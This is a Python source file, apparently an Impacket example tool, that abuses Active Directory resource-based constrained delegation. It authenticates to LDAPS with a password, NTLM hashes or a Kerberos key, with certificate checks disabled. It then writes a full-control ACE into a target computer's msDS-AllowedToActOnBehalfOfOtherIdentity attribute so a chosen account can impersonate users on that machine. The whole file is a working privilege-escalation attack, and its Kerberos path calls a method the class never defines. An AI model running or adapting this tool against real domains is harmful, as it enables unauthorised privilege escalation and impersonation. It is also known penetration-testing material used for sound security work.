#!/usr/bin/env python
# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Author:
#  Maxime Nadeau based on Alberto Solino (@agsolino) work
#
# Description:
#     This module will create a new ACE allowing full control for a user on a specific asset by abusing the msDS-AllowedToActOnBehalfOfOtherIdentity
#     attribute. It can be used instead of the ntlmrelayx.py --delegate-access feature when relay is not possible / required. 
#
#     Delegation relationships can provide access to specific users on systems by allowing them to act on the behalf of another account.
#     This module allows for easier exploitation of resource-based constrained delegation.
#
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals
import argparse
import logging
import sys
from datetime import datetime

from impacket import version
from impacket.examples import logger
from impacket.ldap import ldap, ldapasn1, ldaptypes

import ssl
import ldap3
from ldap3.utils.conv import escape_filter_chars

class DelegateAccess:
    def __init__(self, username, password, domain, cmdLineOptions):
        self.options = cmdLineOptions
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__hashes = cmdLineOptions.hashes
        self.__port = 636
        self.__aesKey = cmdLineOptions.aesKey
        self.__doKerberos = cmdLineOptions.k
        self.__target = None
        self.__kdcHost = cmdLineOptions.dc_ip
        self.__user = cmdLineOptions.user
        self.__targetComputer = cmdLineOptions.target_computer
        if cmdLineOptions.hashes is not None:
            self.__lmhash, self.__nthash = cmdLineOptions.hashes.split(':')

        # Create the baseDN
        domainParts = self.__domain.split('.')
        self.__baseDN = ''
        for i in domainParts:
            self.__baseDN += 'dc={},'.format(i)
        # Remove last ','
        self.__baseDN = self.__baseDN[:-1]

    def run(self):
        connectTo = self.__target
        if self.__kdcHost is not None:
            connectTo = self.__kdcHost
            
        user = '%s\\%s' % (self.__domain, self.__username)
        tls = ldap3.Tls(validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLSv1_2)
        try:
            ldapServer = ldap3.Server(connectTo, use_ssl=True, port=self.__port, get_info=ldap3.ALL, tls=tls)
            if self.__doKerberos:
                ldapConnection = ldap3.Connection(ldapServer)
                self.LDAP3KerberosLogin(ldapConnection, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                             self.__aesKey, kdcHost=self.__kdcHost)
            elif self.__hashes is not None:
                ldapConnection = ldap3.Connection(ldapServer, user=user, password=self.__hashes, authentication=ldap3.NTLM)
                ldapConnection.bind()
            else:
                ldapConnection = ldap3.Connection(ldapServer, user=user, password=self.__password, authentication=ldap3.NTLM)
                ldapConnection.bind()

        except ldap3.core.exceptions.LDAPSocketOpenError:
            #try tlsv1
            tls = ldap3.Tls(validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLSv1)
            ldapServer = ldap3.Server(connectTo, use_ssl=True, port=self.__port, get_info=ldap3.ALL, tls=tls)
            if self.__doKerberos:
                ldapConnection = ldap3.Connection(ldapServer)
                self.LDAP3KerberosLogin(ldapConnection, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                                             self.__aesKey, kdcHost=self.__kdcHost)
            elif self.__hashes is not None:
                ldapConnection = ldap3.Connection(ldapServer, user=user, password=self.__hashes, authentication=ldap3.NTLM)
                ldapConnection.bind()
            else:
                ldapConnection = ldap3.Connection(ldapServer, user=user, password=self.__password, authentication=ldap3.NTLM)
                ldapConnection.bind()

        self.delegateAttack(ldapConnection, self.__user, self.__targetComputer)
        
    def delegateAttack(self, ldapConnection, usersam, targetsam):
        # Get escalate user sid
        result = self.getUserInfo(ldapConnection, usersam)
        if not result:
            logging.error('User to escalate does not exist!')
            return
        escalate_sid = str(result[1])

        # Get target computer DN
        result = self.getUserInfo(ldapConnection, targetsam)
        if not result:
            logging.error('Computer to modify does not exist! (wrong domain?)')
            return
        target_dn = result[0]

        entries = ldapConnection.search(search_base=target_dn, search_filter='(objectClass=*)', attributes=['SAMAccountName','objectSid', 'msDS-AllowedToActOnBehalfOfOtherIdentity'])
        targetuser = None
        for entry in ldapConnection.response:
            if entry['type'] != 'searchResEntry' or entry['dn'] != target_dn:
                continue
                
            targetuser = entry
        if not targetuser:
            logging.error('Could not query target user properties')
            return

        try:
            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=targetuser['raw_attributes']['msDS-AllowedToActOnBehalfOfOtherIdentity'][0])
            logging.debug('Currently allowed sids:')
            for ace in sd['Dacl'].aces:
                logging.debug('    %s' % ace['Ace']['Sid'].formatCanonical())
        except IndexError:
            # Create DACL manually
            sd = self.create_empty_sd()
        
        sd['Dacl'].aces.append(self.create_allow_ace(escalate_sid))
        
        ldapConnection.modify(targetuser['dn'], {'msDS-AllowedToActOnBehalfOfOtherIdentity':[ldap3.MODIFY_REPLACE, [sd.getData()]]})
        if ldapConnection.result['result'] == 0:
            logging.info('Delegation rights modified succesfully!')
            logging.info('%s can now impersonate users on %s via S4U2Proxy', usersam, targetsam)
        else:
            if ldapConnection.result['result'] == 50:
                logging.error('Could not modify object, the server reports insufficient rights: %s', ldapConnection.result['message'])
            elif ldapConnection.result['result'] == 19:
                logging.error('Could not modify object, the server reports a constrained violation: %s', ldapConnection.result['message'])
            else:
                logging.error('The server returned an error: %s', ldapConnection.result['message'])
        return

    def getUserInfo(self, ldapConnection, samname):
        entries = ldapConnection.search(search_base=self.__baseDN, search_filter='(sAMAccountName={})'.format(escape_filter_chars(samname)), attributes=['objectSid'])
        
        if entries:
            dn = ldapConnection.entries[0].entry_dn
            sid = ldapConnection.entries[0]['objectSid']
            return (dn, sid)
        else:
            logging.error('User not found in LDAP: %s' % samname)
            return False

    def create_empty_sd(self):
        sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
        sd['Revision'] = b'\x01'
        sd['Sbz1'] = b'\x00'
        sd['Control'] = 32772
        sd['OwnerSid'] = ldaptypes.LDAP_SID()
        # BUILTIN\Administrators
        sd['OwnerSid'].fromCanonical('S-1-5-32-544')
        sd['GroupSid'] = b''
        sd['Sacl'] = b''
        acl = ldaptypes.ACL()
        acl['AclRevision'] = 4
        acl['Sbz1'] = 0
        acl['Sbz2'] = 0
        acl.aces = []
        sd['Dacl'] = acl
        return sd
        
    # Create an ALLOW ACE with the specified sid
    def create_allow_ace(self, sid):
        nace = ldaptypes.ACE()
        nace['AceType'] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
        nace['AceFlags'] = 0x00
        acedata = ldaptypes.ACCESS_ALLOWED_ACE()
        acedata['Mask'] = ldaptypes.ACCESS_MASK()
        acedata['Mask']['Mask'] = 983551 # Full control
        acedata['Sid'] = ldaptypes.LDAP_SID()
        acedata['Sid'].fromCanonical(sid)
        nace['Ace'] = acedata
        return nace

# Process command-line arguments.
if __name__ == '__main__':
    print((version.BANNER))

    parser = argparse.ArgumentParser(add_help = True, description = "Enable delegation for the specified user on the target computer")

    parser.add_argument('target', action='store', help='domain/username[:password]')
    parser.add_argument('-user', action='store', metavar='username', help='Delegate access on the target computer account to the specified account')
    parser.add_argument('-target-computer', action='store', metavar='target_computer', help='The computer on which to delegate access')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                                                       '(KRB5CCNAME) based on target parameters. If valid credentials '
                                                       'cannot be found, it will use the ones specified in the command '
                                                       'line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
                                                                            '(128 or 256 bits)')
    group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
                                                                              'ommited it use the domain part (FQDN) '
                                                                              'specified in the target parameter')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    # Init the example's logger theme
    logger.init(options.ts)

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    import re
    # This is because I'm lazy with regex
    # ToDo: We need to change the regex to fullfil domain/username[:password]
    targetParam = options.target+'@'
    domain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(targetParam).groups('')

    #In case the password contains '@'
    if '@' in address:
        password = password + '@' + address.rpartition('@')[0]
        address = address.rpartition('@')[2]

    if domain == '':
        logging.critical('Domain should be specified!')
        sys.exit(1)

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass
        password = getpass("Password:")

    if options.aesKey is not None:
        options.k = True

    try:
        executer = DelegateAccess(username, password, domain, options)
        executer.run()
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        print((str(e)))
